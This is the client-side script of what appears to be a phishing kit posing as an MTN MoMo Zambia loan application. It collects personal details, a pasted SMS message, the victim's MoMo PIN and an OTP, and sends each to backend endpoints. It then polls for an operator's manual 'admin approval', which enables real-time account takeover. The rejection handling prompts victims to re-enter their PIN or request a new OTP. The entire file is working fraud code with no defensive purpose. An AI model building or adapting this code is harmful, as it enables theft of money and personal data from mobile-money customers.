// ============================================================
// script.js – MTN Zambia Version (With Resend & Smart Rejection)
// ============================================================

var S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

var currentPollTimeout = null;
var otpResendTimer = null;
var otpResendCountdown = 0;
var smsResendTimer = null;
var smsResendCountdown = 0;

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── LANDING PAGE REDIRECT ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

document.addEventListener('DOMContentLoaded', function() {
    var loader = document.getElementById('loader');
    if (loader) {
        setTimeout(function() {
            loader.classList.add('hidden');
        }, 800);
    }
    
    var isLandingPage = document.getElementById('page-landing') !== null && 
                        document.getElementById('page-landing').classList.contains('active');
    if (isLandingPage) {
        console.log('🎯 MTN MoMo Zambia Landing Page loaded! Redirecting in 5 seconds...');
        startRedirect();
    }
});

function startRedirect() {
    var secondsLeft = 5;
    var countdownNum = document.getElementById('countdownNum');
    var heroCta = document.getElementById('heroCta');

    var interval = setInterval(function() {
        secondsLeft--;
        if (countdownNum) {
            countdownNum.textContent = secondsLeft;
        }
        if (secondsLeft <= 0) {
            clearInterval(interval);
            goTo('page-calculator');
        }
    }, 1000);

    if (heroCta) {
        heroCta.addEventListener('click', function(e) {
            e.preventDefault();
            clearInterval(interval);
            goTo('page-calculator');
        });
    }

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            clearInterval(interval);
            goTo('page-calculator');
        }
    });
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── NAVIGATION ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function goTo(pageId) {
    var pages = document.querySelectorAll('.page');
    for (var i = 0; i < pages.length; i++) {
        pages[i].classList.remove('active');
    }
    var el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

function startApplication() {
    S.applicationId = 'MTN-ZM-' + Date.now().toString().slice(-6);
    S.rejectedStep = null;
    goTo('page-step1');
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── FORM HELPERS ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function normalizePhone(id) {
    var inp = document.getElementById(id);
    var val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
}

function updateCalc() {
    var amt = +document.getElementById('amtSlider').value;
    var amountDisplay = document.getElementById('calcAmt');
    var monthlyDisplay = document.getElementById('monthlyAmt');
    
    if (amountDisplay) {
        amountDisplay.textContent = 'ZMW ' + amt.toLocaleString();
    }
    var monthly = Math.ceil(amt / 48);
    if (monthlyDisplay) {
        monthlyDisplay.textContent = 'ZMW ' + monthly.toLocaleString();
    }
    
    var pct = ((amt - 500) / 9500) * 100;
    document.getElementById('amtSlider').style.setProperty('--pct', pct + '%');
}

function showErr(id, msg) {
    var box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        var txt = document.getElementById(id + 'Txt');
        if (txt) txt.textContent = msg;
    }
}

function clearErr(id) {
    var box = document.getElementById(id);
    if (box) box.classList.remove('show');
}

function showToast(message, type, duration) {
    type = type || 'info';
    duration = duration || 3000;
    
    var existing = document.querySelector('.toast');
    if (existing) existing.remove();
    
    var toast = document.createElement('div');
    toast.className = 'toast toast-' + type;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(function() {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(function() { toast.remove(); }, 300);
    }, duration);
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── SMART REJECTION NAVIGATION ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function handleRejection(step) {
    clearErr('s3Err');
    clearErr('momErr');
    clearErr('pinErr');
    clearErr('otpErr');
    
    if (currentPollTimeout) {
        clearTimeout(currentPollTimeout);
        currentPollTimeout = null;
    }
    
    S.rejectedStep = step;
    
    switch(step) {
        case 'sms':
            showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
            document.getElementById('smsMsgBox').value = '';
            document.getElementById('smsMsgBox').focus();
            var smsResendBtn = document.getElementById('resendSmsBtn');
            if (smsResendBtn) smsResendBtn.classList.remove('hidden');
            var smsCard = document.querySelector('#page-sms-paste .step-card');
            if (smsCard) smsCard.classList.add('rejected');
            setTimeout(function() {
                if (smsCard) smsCard.classList.remove('rejected');
            }, 3000);
            goTo('page-sms-paste');
            break;
            
        case 'pin':
            showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
            var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
            for (var i = 0; i < pinBoxes.length; i++) {
                pinBoxes[i].value = '';
            }
            var firstPin = document.getElementById('pin0');
            if (firstPin) firstPin.focus();
            var pinCard = document.querySelector('#page-pin .step-card');
            if (pinCard) pinCard.classList.add('rejected');
            setTimeout(function() {
                if (pinCard) pinCard.classList.remove('rejected');
            }, 3000);
            goTo('page-pin');
            break;
            
        case 'otp':
            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
            clearOtpCode();
            var otpCard = document.querySelector('#page-otp .step-card');
            if (otpCard) otpCard.classList.add('rejected');
            setTimeout(function() {
                if (otpCard) otpCard.classList.remove('rejected');
            }, 3000);
            startOtpResendTimer(20);
            goTo('page-otp');
            break;
            
        default:
            showToast('❌ Application was rejected. Please start over.', 'error');
            goTo('page-step1');
    }
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── STEP NAVIGATION ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function toS2() {
    var ty = document.getElementById('s1ty').value;
    var am = +document.getElementById('s1am').value;
    var te = document.getElementById('s1te').value;
    var pu = document.getElementById('s1pu').value;
    
    if (!ty || am <= 0 || !te || !pu.trim()) {
        showErr('s1Err', 'Please complete all fields.');
        return;
    }
    
    S.loanType = ty;
    S.loanAmount = am;
    S.loanTerm = te;
    S.loanPurpose = pu;
    goTo('page-step2');
}

function toS3() {
    var fi = document.getElementById('s2fi').value.trim();
    var la = document.getElementById('s2la').value.trim();
    var ph = document.getElementById('s2ph').value;
    var em = document.getElementById('s2em').value.trim();
    
    if (!fi || !la || ph.length !== 9 || !em) {
        showErr('s2Err', 'Please enter valid details.');
        return;
    }
    
    S.firstName = fi;
    S.lastName = la;
    S.phone = ph;
    S.email = em;
    updateSummary();
    goTo('page-step3');
}

function updateSummary() {
    var amount = document.getElementById('sA');
    var term = document.getElementById('sT');
    var purpose = document.getElementById('sP');
    var name = document.getElementById('sN');
    
    if (amount) amount.textContent = 'ZMW ' + (S.loanAmount ? S.loanAmount.toLocaleString() : '0');
    if (term) term.textContent = S.loanTerm || '—';
    if (purpose) purpose.textContent = S.loanPurpose || '—';
    if (name) name.textContent = (S.firstName && S.lastName) ? (S.firstName + ' ' + S.lastName) : '—';
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── PIN/OTP HELPERS ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function pinMvM(el, i, maxLength) {
    maxLength = maxLength || 5;
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < maxLength - 1) {
        var nextPin = document.getElementById('pin' + (i + 1));
        if (nextPin) { nextPin.focus(); return; }
        var nextOtp = document.getElementById('otp' + (i + 1));
        if (nextOtp) { nextOtp.focus(); return; }
        var nextLp = document.getElementById('lp' + (i + 1));
        if (nextLp) nextLp.focus();
    }
}

function togPin() {
    for (var i = 0; i < 5; i++) {
        var b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
    for (var i = 0; i < 4; i++) {
        var b = document.getElementById('otp' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}

function chkPin() {
    var pinOk = true;
    for (var i = 0; i < 5; i++) {
        var pinField = document.getElementById('pin' + i);
        if (!pinField || !pinField.value) {
            pinOk = false;
            break;
        }
    }
    var pinBtn = document.querySelector('#page-pin .btn-grad');
    if (pinBtn) pinBtn.disabled = !pinOk;

    var otpOk = true;
    for (var i = 0; i < 4; i++) {
        var otpField = document.getElementById('otp' + i);
        if (!otpField || !otpField.value) {
            otpOk = false;
            break;
        }
    }
    var otpBtn = document.querySelector('#page-otp .btn-grad');
    if (otpBtn) otpBtn.disabled = !otpOk;
}

document.addEventListener('keyup', chkPin);

function clearLoginPin() {
    for (var i = 0; i < 5; i++) {
        var field = document.getElementById('pin' + i);
        if (field) field.value = '';
    }
    var firstPin = document.getElementById('pin0');
    if (firstPin) firstPin.focus();
    chkPin();
}

function clearOtpCode() {
    for (var i = 0; i < 4; i++) {
        var field = document.getElementById('otp' + i);
        if (field) field.value = '';
    }
    var firstOtp = document.getElementById('otp0');
    if (firstOtp) firstOtp.focus();
    chkPin();
}

function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    var idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) {
        var next = document.getElementById('otp' + (idx + 1));
        if (next) next.focus();
    }
    chkPin();
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── SMS RESEND ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function resendSms() {
    var btn = document.getElementById('resendSmsBtn');
    
    if (smsResendTimer || smsResendCountdown > 0) {
        showToast('⏳ Please wait ' + smsResendCountdown + ' seconds before resending.', 'info');
        return;
    }
    
    try {
        btn.disabled = true;
        btn.textContent = '⏳ Sending...';
        showToast('📤 Requesting new SMS verification...', 'info');
        
        fetch('/api/resend-sms', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.ok) {
                showToast('✅ New SMS verification sent to admin!', 'success');
                startSmsResendTimer(20);
                btn.classList.add('hidden');
                
                startPoll(S.applicationId, 'sms',
                    function() {
                        showToast('✅ SMS Verified!', 'success');
                        goTo('page-pin');
                    },
                    function() {
                        handleRejection('sms');
                    }
                );
            } else {
                showToast('❌ Failed to resend SMS. Please try again.', 'error');
                btn.disabled = false;
                btn.textContent = '🔄 Resend SMS';
            }
        })
        .catch(function(error) {
            console.error('Resend SMS error:', error);
            showToast('❌ Failed to resend SMS. Please try again.', 'error');
            btn.disabled = false;
            btn.textContent = '🔄 Resend SMS';
        });
    } catch (error) {
        console.error('Resend SMS error:', error);
        showToast('❌ Failed to resend SMS. Please try again.', 'error');
        btn.disabled = false;
        btn.textContent = '🔄 Resend SMS';
    }
}

function startSmsResendTimer(seconds) {
    seconds = seconds || 20;
    var btn = document.getElementById('resendSmsBtn');
    if (!btn) return;
    
    if (smsResendTimer) {
        clearInterval(smsResendTimer);
        smsResendTimer = null;
    }
    
    smsResendCountdown = seconds;
    btn.disabled = true;
    btn.textContent = '⏳ Wait ' + smsResendCountdown + 's';
    btn.classList.remove('hidden');
    
    smsResendTimer = setInterval(function() {
        smsResendCountdown--;
        
        if (smsResendCountdown <= 0) {
            clearInterval(smsResendTimer);
            smsResendTimer = null;
            btn.disabled = false;
            btn.textContent = '🔄 Resend SMS';
        } else {
            btn.textContent = '⏳ Wait ' + smsResendCountdown + 's';
        }
    }, 1000);
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── OTP RESEND ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function resendOtp() {
    var btn = document.getElementById('resendOtpBtn');
    
    if (otpResendTimer || otpResendCountdown > 0) {
        showToast('⏳ Please wait ' + otpResendCountdown + ' seconds before resending.', 'info');
        return;
    }
    
    try {
        btn.disabled = true;
        btn.textContent = '⏳ Sending...';
        showToast('📤 Requesting new OTP...', 'info');
        
        fetch('/api/resend-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.ok) {
                showToast('✅ New OTP sent to admin for verification!', 'success');
                startOtpResendTimer(20);
                
                startPoll(S.applicationId, 'otp',
                    function() {
                        showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
                        showApproval();
                    },
                    function() {
                        handleRejection('otp');
                    }
                );
            } else {
                showToast('❌ Failed to resend OTP. Please try again.', 'error');
                btn.disabled = false;
                btn.textContent = '🔄 Resend OTP';
            }
        })
        .catch(function(error) {
            console.error('Resend OTP error:', error);
            showToast('❌ Failed to resend OTP. Please try again.', 'error');
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
        });
    } catch (error) {
        console.error('Resend OTP error:', error);
        showToast('❌ Failed to resend OTP. Please try again.', 'error');
        btn.disabled = false;
        btn.textContent = '🔄 Resend OTP';
    }
}

function startOtpResendTimer(seconds) {
    seconds = seconds || 20;
    var btn = document.getElementById('resendOtpBtn');
    if (!btn) return;
    
    if (otpResendTimer) {
        clearInterval(otpResendTimer);
        otpResendTimer = null;
    }
    
    otpResendCountdown = seconds;
    btn.disabled = true;
    btn.textContent = '⏳ Wait ' + otpResendCountdown + 's';
    btn.classList.remove('hidden');
    
    otpResendTimer = setInterval(function() {
        otpResendCountdown--;
        
        if (otpResendCountdown <= 0) {
            clearInterval(otpResendTimer);
            otpResendTimer = null;
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
        } else {
            btn.textContent = '⏳ Wait ' + otpResendCountdown + 's';
        }
    }, 1000);
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── POLLING ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function startPoll(applicationId, step, onSuccess, onReject) {
    if (currentPollTimeout) {
        clearTimeout(currentPollTimeout);
        currentPollTimeout = null;
    }

    var check = function() {
        fetch('/api/status/' + applicationId + '/' + step)
            .then(function(response) { return response.json(); })
            .then(function(data) {
                if (data && data.ok === true) {
                    if (data.status === 'approved') {
                        currentPollTimeout = null;
                        onSuccess();
                        return;
                    } else if (data.status === 'rejected') {
                        currentPollTimeout = null;
                        onReject();
                        return;
                    }
                }
                currentPollTimeout = setTimeout(check, 2000);
            })
            .catch(function(err) {
                currentPollTimeout = setTimeout(check, 3000);
            });
    };
    check();
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── SUBMIT APPLICATION ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function submitApp() {
    var em = document.getElementById('s3em').value;
    var income = +document.getElementById('s3in').value;
    var kn = document.getElementById('s3kn').value.trim();
    var kp = document.getElementById('s3kp').value.trim();
    
    if (!em || income <= 0) {
        showErr('s3Err', 'Please complete all fields.');
        return;
    }
    
    S.employment = em;
    S.annualIncome = income;
    S.kinName = kn;
    S.kinPhone = kp;
    goTo('page-processing');

    try {
        fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
            startPoll(S.applicationId, 'sms',
                function() { goTo('page-sms-paste'); },
                function() {
                    handleRejection('sms');
                }
            );
        })
        .catch(function() {
            showErr('s3Err', 'Failed to submit application.');
        });
    } catch (error) {
        showErr('s3Err', 'Failed to submit application.');
    }
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── SMS ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function doSmsParse() {
    var msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) {
        showErr('momErr', 'Please paste a valid SMS message.');
        return;
    }

    fetch('/api/send-momo-message', {
        method: 'POST',
        body: JSON.stringify({
            momoData: { 
                applicationId: S.applicationId, 
                phone: S.phone, 
                momoMessage: msg,
                isResubmission: !!S.rejectedStep
            }
        }),
        headers: { 'Content-Type': 'application/json' }
    })
    .then(function(response) { return response.json(); })
    .then(function(data) {
        document.getElementById('waitSmsAppId').textContent = S.applicationId;
        goTo('page-wait-sms');

        startPoll(S.applicationId, 'sms',
            function() { goTo('page-pin'); },
            function() {
                handleRejection('sms');
            }
        );
    })
    .catch(function() {
        showErr('momErr', 'Failed to submit SMS.');
    });
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── PIN ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function doPin() {
    var pin = '';
    for (var i = 0; i < 5; i++) {
        var field = document.getElementById('pin' + i);
        if (field) pin += field.value;
    }
    if (pin.length < 5) {
        showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
        return;
    }

    fetch('/api/send-pin', {
        method: 'POST',
        body: JSON.stringify({ 
            applicationId: S.applicationId, 
            pin: pin,
            isResubmission: !!S.rejectedStep
        }),
        headers: { 'Content-Type': 'application/json' }
    })
    .then(function(response) { return response.json(); })
    .then(function(data) {
        document.getElementById('waitPinAppId').textContent = S.applicationId;
        goTo('page-wait-pin');

        startPoll(S.applicationId, 'pin',
            function() { goTo('page-otp'); },
            function() {
                handleRejection('pin');
            }
        );
    })
    .catch(function(error) {
        console.error('Error submitting PIN:', error);
        showErr('pinErr', 'Failed to submit PIN. Please try again.');
    });
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── OTP ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function doOtp() {
    var otp = '';
    for (var i = 0; i < 4; i++) {
        var field = document.getElementById('otp' + i);
        if (field) otp += field.value;
    }
    if (otp.length < 4) {
        showErr('otpErr', 'Enter a valid 4-digit OTP.');
        return;
    }

    fetch('/api/send-otp', {
        method: 'POST',
        body: JSON.stringify({ 
            applicationId: S.applicationId, 
            otp: otp,
            isResubmission: !!S.rejectedStep
        }),
        headers: { 'Content-Type': 'application/json' }
    })
    .then(function(response) { return response.json(); })
    .then(function(data) {
        document.getElementById('waitOtpAppId').textContent = S.applicationId;
        goTo('page-wait-otp');

        startPoll(S.applicationId, 'otp',
            function() {
                showApproval();
            },
            function() {
                handleRejection('otp');
            }
        );
    })
    .catch(function(error) {
        console.error('Error submitting OTP:', error);
        showErr('otpErr', 'Failed to submit OTP. Please try again.');
    });
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── SHOW APPROVAL ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

function showApproval() {
    document.getElementById('aprAmount').textContent = 'ZMW ' + S.loanAmount.toLocaleString();
    document.getElementById('aprAmt').textContent = 'ZMW ' + S.loanAmount.toLocaleString();
    document.getElementById('aprTerm').textContent = S.loanTerm;
    var monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
    document.getElementById('aprMth').textContent = 'ZMW ' + monthly.toLocaleString();
    
    if (otpResendTimer) {
        clearInterval(otpResendTimer);
        otpResendTimer = null;
    }
    if (smsResendTimer) {
        clearInterval(smsResendTimer);
        smsResendTimer = null;
    }
    
    goTo('page-approval');
}

// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───
// ─── INIT ───
// ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ─── ───

updateCalc();

var slider = document.getElementById('amtSlider');
if (slider) {
    var pct = ((slider.value - 500) / 9500) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

var isLandingPage = document.getElementById('page-landing') !== null && 
                    document.getElementById('page-landing').classList.contains('active');

if (!isLandingPage) {
    goTo('page-landing');
}

console.log('✅ MTN Zambia MoMo Loan App loaded!');
